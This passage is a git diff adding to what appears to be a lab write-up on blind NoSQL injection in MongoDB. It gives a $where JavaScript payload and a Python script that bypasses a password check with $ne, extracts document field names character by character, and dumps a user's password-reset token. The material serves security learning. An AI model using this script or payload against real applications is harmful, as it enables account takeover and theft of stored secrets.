@@ -97,3 +97,90 @@ if __name__ == "__main__":
 
 <img width="834" height="238" alt="image" src="https://github.com/user-attachments/assets/025a467d-7f10-40f3-bf24-1393ea568701" />
 
+-----------------
+
+### Extracting fields' names
+
+----------------
+
+- Payload-:
+
+```js
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"
+```
+
+- Lab's script-:
+
+```python3
+#! /usr/bin/env python3
+import requests
+import asyncio
+import string
+import itertools
+
+url = "https://0abd006a037036f7804a6255003200ed.web-security-academy.net/login"
+valid_word = "Account locked: please reset your password"
+charset = "_" + string.digits + string.ascii_letters 
+
+#FIltering chars that are special in js
+
+async def filter_char(character: str):
+     if character not in string.ascii_letters + string.digits + '!"#%&,-:;<=>@_~`': 
+        return "\\" + character 
+     else: 
+        return character
+# Finding object keys length
+async def find_keysLength(index: int):
+     for counter in range(80):
+        payload = f"Object.keys(this)[{index}].length == {counter}"
+        data = {"username":"carlos","password":{"$ne":""},"$where":payload}
+        text = requests.post(url,json=data).text
+        if valid_word in text:
+            print(f"[+]Objectindex{index}::length:->{counter}")
+            break
+     return counter
+
+async def dump_keysStrings():
+    keys = []
+    for counter in range(4,5):
+        length = await find_keysLength(counter)
+        keys.append("")
+        for char_counter in range(length):
+            pick_counter = counter - (counter + 1)
+            for char in charset:
+                char = await filter_char(char)
+                payload = f"Object.keys(this)[{counter}].match('^{keys[pick_counter] + char}')"
+                #print(payload)
+                data = {"username":"carlos","password":{"$ne":""},"$where":payload}
+                text = requests.post(url,json=data).text
+                if valid_word in text:
+                   keys[pick_counter] += char
+                   print(f"[+] Key:index{counter}::Found Char:{keys[pick_counter]}")
+                   break
+            if len(keys[pick_counter]) ==  length:
+                print(f"[+] Keys:{counter}'s field found::{keys[pick_counter]}")
+                break
+    return keys[-1]
+async def dump_key(field: str) -> string:
+    found_chars = ""
+    while True:
+        for char in charset:
+            char = await filter_char(char)
+            payload = f"(this.{field}).toString().match('^{found_chars + char}')"
+            data = {"username":"carlos","password":{"$ne":""},"$where":payload}
+            text = requests.post(url,json=data).text
+            if valid_word in text:
+                found_chars += char
+                print(f"[+] Found chars::{found_chars}")
+                break
+        if len(found_chars) == 16:
+            print(f"[+]Found token:: {found_chars}")
+async def main():
+    field =  await dump_keysStrings()
+    await dump_key("resetPwdToken")
+  
+if __name__ == "__main__":
+    asyncio.run(main())
+```
+
+- 
